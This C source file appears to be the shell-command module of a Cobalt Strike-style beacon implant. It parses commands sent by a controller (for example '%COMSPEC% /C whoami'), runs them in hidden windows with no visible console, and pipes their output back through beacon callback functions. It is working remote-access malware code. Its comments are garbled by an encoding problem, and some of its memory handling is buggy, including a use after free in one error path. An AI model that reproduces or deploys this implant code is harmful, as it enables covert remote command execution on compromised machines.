#include "Command.h"
#include "Shell.h"

#pragma warning(disable:4996)

ParseCommandShellStruct ParseCommandShell(unsigned char* cmdBuffer, int cmdBufferLength) {
    // pathLength(4 Bytes) || path(pathLength Bytes) || cmdLength(4 Bytes) ||  cmd(cmdLength Bytes)
	datap parser;
	BeaconDataParse(&parser, cmdBuffer, cmdBufferLength);
	unsigned char* path = BeaconDataStringPointer(&parser);    // %COMSPEC%
	unsigned char* cmdArgs = BeaconDataStringPointer(&parser); // /C whoami
    unsigned char* envKey = str_replace_all(path, "%", "");
	unsigned char* cmdPathFromEnv = getenv(envKey);            // C:\WINDOWS\system32\cmd.exe

    ParseCommandShellStruct parsecmdshell;
    parsecmdshell.shellPath = cmdPathFromEnv;
    parsecmdshell.shellBuf = cmdArgs;

    return parsecmdshell;
}

DWORD WINAPI myThreadCmdRun(LPVOID lpParam) {
    Sleep(2000);
    struct ShellThreadArgs* args = (struct ShellThreadArgs*)lpParam;
    unsigned char* cmdBuffer = args->cmdBuffer;
    size_t cmdBufferLength = args->cmdBufferLength;

    BOOL bRet = FALSE;

    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    // ����������Ϊ TRUE ��ʾ�ӽ��̿��Լ̳йܵ����
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        fprintf(stderr, "CreatePipe failed with error:%lu\n", GetLastError());
        free(args);
        free(args->cmdBuffer);
        return FALSE;
    }

    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.cb = sizeof(STARTUPINFO);
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;
    si.wShowWindow = SW_HIDE;

    ParseCommandShellStruct ParseCommand = ParseCommandShell(cmdBuffer, cmdBufferLength);
    unsigned char* shellBuf = ParseCommand.shellBuf;

    // ִ�н����д�� hReadPipe 
    if (!CreateProcessA(NULL, shellBuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "CreateProcessA failed with error:%lu\n", GetLastError());
        free(args->cmdBuffer);
        free(args);
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return FALSE;
    }

    DWORD numberOfBytesRead = 0;
    DWORD bufferSize = 1024 * 10;
    BOOL firstTime = TRUE;
    unsigned char* buffer = (unsigned char*)malloc(bufferSize);

    // �رո����̹ܵ����������رգ������� hWritePipe û�����ݵ������ ReadFile ������
    if (CloseHandle(hWritePipe) == FALSE) {
        fprintf(stderr, "CloseHandle failed with error:%lu\n", GetLastError());
        free(buffer);
        free(args->cmdBuffer);
        free(args);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(hReadPipe);
        return FALSE;
    }

    while (TRUE) {
        Sleep(5000);

        if (!ReadFile(hReadPipe, buffer, bufferSize, &numberOfBytesRead, NULL)) {
            DWORD errorCode = GetLastError();
            // hWritePipe ����رպ�û����������� ERROR_BROKEN_PIPE
            if (errorCode == ERROR_BROKEN_PIPE) {
                unsigned char* endStr = "-----------------------------------end-----------------------------------\n";
                unsigned char* postMsg = malloc(strlen(endStr) + 1);
                if (postMsg) {
                    memcpy(postMsg, endStr, strlen(endStr) + 1);
                    postMsg[strlen(endStr)] = '\0';
                    DataProcess(postMsg, strlen(endStr), CALLBACK_OUTPUT);
                    free(postMsg);
                    break;
                }
            }
            else {
                fprintf(stderr, "ReadFile failed with error:%lu\n", errorCode);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                CloseHandle(hReadPipe);
                free(buffer);
                free(args->cmdBuffer);
                free(args);
                return FALSE;
            }
        }
        else {
            if (numberOfBytesRead > 0) {
                if (firstTime) {
                    unsigned char* postMsg = (unsigned char*)malloc(numberOfBytesRead + 1);
                    if (postMsg && buffer) {
                        memcpy(postMsg, buffer, numberOfBytesRead);
                        DataProcess(postMsg, numberOfBytesRead, CALLBACK_OUTPUT);
                        free(postMsg);
                    }
                    firstTime = FALSE;
                }
                else {
                    char prefix[MAX_PATH];
                    snprintf(prefix, MAX_PATH, "[+] %s :\n", shellBuf);
                    DataProcess((unsigned char*)prefix, strlen(prefix), CALLBACK_OUTPUT);
                    unsigned char* postMsg = (unsigned char*)malloc(numberOfBytesRead + 1);
                    if (postMsg && buffer) {
                        memcpy(postMsg, buffer, numberOfBytesRead);
                        DataProcess(postMsg, numberOfBytesRead, CALLBACK_OUTPUT);
                        free(postMsg);
                    }
                }
            }
        }
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hReadPipe);
    free(buffer);
    free(args->cmdBuffer);
    free(args);

    return TRUE;
}

DWORD WINAPI myThreadCmdshell(LPVOID lpParam) {
    Sleep(2000);
    struct ShellThreadArgs* args = (struct ShellThreadArgs*)lpParam;
    unsigned char* cmdBuffer = args->cmdBuffer;
    size_t cmdBufferLength = args->cmdBufferLength;

    BOOL bRet = FALSE;

    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
	// ����������Ϊ TRUE ��ʾ�ӽ��̿��Լ̳йܵ����
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        fprintf(stderr, "CreatePipe failed with error:%lu\n", GetLastError());
        free(args->cmdBuffer);
        free(args);
        return FALSE;
    }

    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.cb = sizeof(STARTUPINFO);
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;
    si.wShowWindow = SW_HIDE;

    ParseCommandShellStruct ParseCommand = ParseCommandShell(cmdBuffer, cmdBufferLength);
    unsigned char* shellPath = ParseCommand.shellPath;
    unsigned char* shellBuf = ParseCommand.shellBuf;

    // ���� CreateProcessA ����
    CHAR commandLine[MAX_PATH];
    // C:\WINDOWS\system32\cmd.exe /C whoami
    snprintf(commandLine, MAX_PATH, "%s %s", shellPath, shellBuf);

    // ִ�н����д�� hWritePipe 
    if (!CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "CreateProcessA failed with error:%lu\n", GetLastError());
        free(args->cmdBuffer);
        free(args);
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return FALSE;
    }

	DWORD numberOfBytesRead = 0;
    DWORD bufferSize = 1024 * 10;
	BOOL firstTime = TRUE;
    unsigned char* buffer = (unsigned char*)malloc(bufferSize);
    
	// �رո����̹ܵ����������رգ������� hWritePipe û�����ݵ������ ReadFile ������
    if(CloseHandle(hWritePipe) == FALSE) {
        fprintf(stderr, "CloseHandle failed with error:%lu\n", GetLastError());
        free(buffer);
        free(args->cmdBuffer);
        free(args);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(hReadPipe);
        return FALSE;
	}

    while (TRUE) {
        Sleep(5000);
        if(!ReadFile(hReadPipe, buffer, bufferSize, &numberOfBytesRead, NULL)) {
            DWORD errorCode = GetLastError();
            // hWritePipe ����رպ�û����������� ERROR_BROKEN_PIPE
            if (errorCode == ERROR_BROKEN_PIPE) {
                unsigned char* endStr = "-----------------------------------end-----------------------------------\n";
                unsigned char* resultStr = malloc(strlen(endStr) + 1);
                if(resultStr) {
                    memcpy(resultStr, endStr, strlen(endStr) + 1);
					resultStr[strlen(endStr)] = '\0';
                    DataProcess(resultStr, strlen(endStr), CALLBACK_OUTPUT);
                    break;
				}
            }
            else {
                fprintf(stderr, "ReadFile failed with error:%lu\n", errorCode);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                CloseHandle(hReadPipe);
                free(buffer);
                free(args->cmdBuffer);
                free(args);
                return FALSE;
            }
		}
        else {
            if(numberOfBytesRead > 0) {
                if (firstTime) {
                    unsigned char* postMsg = (unsigned char*)malloc(numberOfBytesRead + 1);
                    if (postMsg && buffer) {
                        memcpy(postMsg, buffer, numberOfBytesRead);
                        DataProcess(postMsg, numberOfBytesRead, CALLBACK_OUTPUT);
                        free(postMsg);
                    }
                    firstTime = FALSE;
                }
                else {
                    char prefix[MAX_PATH];   
                    snprintf(prefix, MAX_PATH, "[*] %s:\n", commandLine);
                    DataProcess(prefix, strlen(prefix), 0);
                    unsigned char* postMsg = (unsigned char*)malloc(numberOfBytesRead + 1);
                    if (postMsg && buffer) {
                        memcpy(postMsg, buffer, numberOfBytesRead);
                        DataProcess(postMsg, numberOfBytesRead, CALLBACK_OUTPUT);
                        free(postMsg);
                    }
                }
			}
        }
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hReadPipe);
    free(buffer);
    free(args->cmdBuffer);
    free(args);

    return TRUE;
}

VOID CmdShell(unsigned char* commandBuf, size_t commandBuflen) { 
	// ����߳����е� commandBuf ���ܱ��ͷŵ�����
    struct ShellThreadArgs* args = malloc(sizeof(struct ShellThreadArgs));
    if (!args) {
		fprintf(stderr, "Memory allocation failed\n");
        return;
    }

    datap parser;
    BeaconDataParse(&parser, commandBuf, commandBuflen);

    args->cmdBuffer = (unsigned char*)malloc(commandBuflen);
    if(!args->cmdBuffer) {
        fprintf(stderr, "Memory allocation failed\n");
        free(args);
        return;
	}

    memcpy(args->cmdBuffer, BeaconDataPtr(&parser, commandBuflen), commandBuflen);
    args->cmdBufferLength = commandBuflen;

    ParseCommandShellStruct ParseCommand = ParseCommandShell(args->cmdBuffer, args->cmdBufferLength);
    HANDLE myThread;
    if (ParseCommand.shellPath == NULL) {
        myThread = CreateThread(
            NULL,                       // Ĭ���̰߳�ȫ��
            0,                          // Ĭ�϶�ջ��С
            myThreadCmdRun,             // �̺߳���
            args,                       // ���ݸ��̺߳����Ĳ���
            0,                          // Ĭ�ϴ�����־
            NULL);                      // ���洢�߳�ID
        if (myThread == NULL) {
            fprintf(stderr, "CeateThread failed with error: %lu\n", GetLastError());
			free(args->cmdBuffer);
            free(args);
            return;
        }
    }
    else {
        // shell ָ������� Ӧ�ö��ǽ��������֧
        myThread = CreateThread(
            NULL,                       // Ĭ���̰߳�ȫ��
            0,                          // Ĭ�϶�ջ��С
            myThreadCmdshell,           // �̺߳���
            args,                       // ���ݸ��̺߳����Ĳ���
            0,                          // Ĭ�ϴ�����־
            NULL);                      // ���洢�߳�ID
        if (myThread == NULL) {
            fprintf(stderr, "CeateThread failed with error: %lu\n", GetLastError());
            free(args->cmdBuffer);
            free(args);
            return;
        }
        // �첽ִ��
		// ��ʹ�� WaiteForSingleObject
        // WaitForSingleObject(myThread, INFINITE);
        CloseHandle(myThread);
    }
}
